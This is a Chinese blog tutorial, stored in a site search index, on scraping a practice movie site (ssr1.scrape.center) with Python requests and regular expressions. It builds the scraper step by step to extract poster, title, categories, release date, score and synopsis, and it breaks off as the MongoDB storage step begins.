<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>爬虫小项目1</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫小项目：爬取https-ssr1-scrape-center"><a href="#爬虫小项目：爬取https-ssr1-scrape-center" class="headerlink" title="爬虫小项目：爬取https://ssr1.scrape.center/"></a>爬虫小项目：爬取<a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></h1><p><img src="/img/image-20230929172430337.png" alt="image-20230929172430337"></p><p><img src="/img/image-20230929172522452.png" alt="image-20230929172522452"></p><h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h2><p>1.按列表顺序爬取每个电影详情页</p><p>2.利用正则提取海报、名称、类别、上映时间、评分、剧情简介</p><p>3.将爬取的内容保存下来</p><h2 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a><strong>网页分析：</strong></h2><p><img src="/img/image-20230930145223731.png" alt="image-20230930145223731"></p><p>海报和标题都有跳转到详情页的链接&#x2F;detail&#x2F;1</p><p><img src="/img/image-20230930145514680.png" alt="image-20230930145514680"></p><p>页码url为&#x2F;page&#x2F;3    一共10页</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a><strong>实现</strong></h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-number">1.</span>遍历所有页码，拼接<span class="hljs-built_in">url</span><br><span class="hljs-number">2.</span>拿到详情页页面的<span class="hljs-built_in">url</span><br><span class="hljs-number">3.</span>在详情页面用正则匹配出需要的内容<br><span class="hljs-number">4</span>，保存数据<br></code></pre></td></tr></table></figure><p>需要匹配详情页的标签：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/1&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br><br>正则：<br>&lt;a.*<span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;(.*?)&quot;</span>.*?class=&quot;name&quot;&gt;<br></code></pre></td></tr></table></figure><p>非贪婪模式：</p><img src="/img/image-20230930154636668.png" alt="image-20230930154636668" style="zoom:67%;" /><h3 id="第一步：获取到所有的详情页链接"><a href="#第一步：获取到所有的详情页链接" class="headerlink" title="第一步：获取到所有的详情页链接"></a>第一步：获取到所有的详情页链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一页面的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#抓取某个页面的内容</span><br>        index_html = scrape_index(page)<br>        <span class="hljs-comment">#抓取该页面上跳转详情页的链接</span><br>        details_urls = parse_index(index_html)<br>        <span class="hljs-comment">#print(list(details_urls))</span><br>        logging.info(<span class="hljs-string">&quot;详情页面链接%s&quot;</span>,<span class="hljs-built_in">list</span>(details_urls))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930161236158.png" alt="image-20230930161236158"></p><h3 id="第二步：爬取详情页信息"><a href="#第二步：爬取详情页信息" class="headerlink" title="第二步：爬取详情页信息"></a>第二步：爬取详情页信息</h3><p>分析：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>图片：img标签<br><span class="hljs-number">2.</span>类别：两个button里的span标签<br><span class="hljs-number">3.</span>上映时间：div里的span标签<br><span class="hljs-number">4.</span>评分：p标签<br><span class="hljs-number">5.</span>剧情简介：div <span class="hljs-keyword">class</span>=<span class="hljs-symbol">drama</span>里的<span class="hljs-symbol">p</span>标签<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930163136158.png" alt="image-20230930163136158"></p><p>正则测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-comment">#1.url</span><br><span class="hljs-comment"># txt = &#x27;&lt;img data-v-63864230=&quot;&quot; src=&quot;https://p0.meituan.net/movie/ce4da3e03e655b5b88ed31b5cd7896cf62472.jpg@464w_644h_1e_1c&quot; class=&quot;cover&quot;&gt;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split(&#x27;@&#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#2.种类</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     &lt;div data-v-63864230=&quot;&quot; class=&quot;categories&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;剧情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;爱情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># #注意这里要加上re.S  .任意匹配  包括换行符</span><br><span class="hljs-comment"># #因为.是匹配除了换行符之外的任意字符</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.findall(pattern,txt)</span><br><span class="hljs-comment"># print(response)</span><br><br><br><span class="hljs-comment">#3.上映时间</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-7f856186=&quot;&quot; class=&quot;m-v-sm info&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;span data-v-7f856186=&quot;&quot;&gt;1993-07-26 上映&lt;/span&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; 上映&#x27;)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(0).split(&#x27; &#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#评分</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;el-col el-col-24 el-col-xs-8 el-col-sm-4&quot;&gt;&lt;p data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                                                                                         class=&quot;score m-t-md m-b-n-sm&quot;&gt;</span><br><span class="hljs-comment">#               9.5&lt;/p&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split()</span><br><span class="hljs-comment"># print(response[0])</span><br><br><br><span class="hljs-comment">#剧情简介</span><br>txt = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;div data-v-63864230=&quot;&quot; class=&quot;drama&quot;&gt;&lt;h3 data-v-63864230=&quot;&quot;&gt;剧情简介&lt;/h3&gt;</span><br><span class="hljs-string">                &lt;p data-v-63864230=&quot;&quot;&gt;</span><br><span class="hljs-string">                  影片借一出《霸王别姬》的京戏，牵扯出三个人之间一段随时代风云变幻的爱恨情仇。段小楼（张丰毅 饰）与程蝶衣（张国荣 饰）是一对打小一起长大的师兄弟，两人一个演生，一个饰旦，一向配合天衣无缝，尤其一出《霸王别姬》，更是誉满京城，为此，两人约定合演一辈子《霸王别姬》。但两人对戏剧与人生关系的理解有本质不同，段小楼深知戏非人生，程蝶衣则是人戏不分。段小楼在认为该成家立业之时迎娶了名妓菊仙（巩俐 饰），致使程蝶衣认定菊仙是可耻的第三者，使段小楼做了叛徒，自此，三人围绕一出《霸王别姬》生出的爱恨情仇战开始随着时代风云的变迁不断升级，终酿成悲剧。</span><br><span class="hljs-string">                &lt;/p&gt;&lt;/div&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>response = re.search(pattern,txt).group(<span class="hljs-number">1</span>).strip()<br><span class="hljs-built_in">print</span>(response)<br><br><span class="hljs-comment">#名称</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;p-h el-col el-col-24 el-col-xs-16 el-col-sm-12&quot;&gt;</span><br><span class="hljs-comment">#               &lt;a data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                  class=&quot;router-link-exact-active router-link-active&quot;&gt;</span><br><span class="hljs-comment">#                 &lt;h2 data-v-63864230=&quot;&quot; class=&quot;m-b-sm&quot;&gt;霸王别姬 - Farewell My Concubine&lt;/h2&gt;&lt;/a&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1)</span><br><span class="hljs-comment"># print(response)</span><br></code></pre></td></tr></table></figure><p><strong>实现获取指定页每个电影详情页信息的代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        logging.info(<span class="hljs-string">&quot;get detail data %s&quot;</span> % data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930190440051.png" alt="image-20230930190440051"></p><h3 id="第三步-存入数据库（mongodb）-多线程"><a href="#第三步-存入数据库（mongodb）-多线程" class="headerlink" title="第三步 存入数据库（mongodb）+多线程"></a>第三步 存入数据库（mongodb）+多线程</h3><p>centos7安装mongodb3.6以上</p><p><a 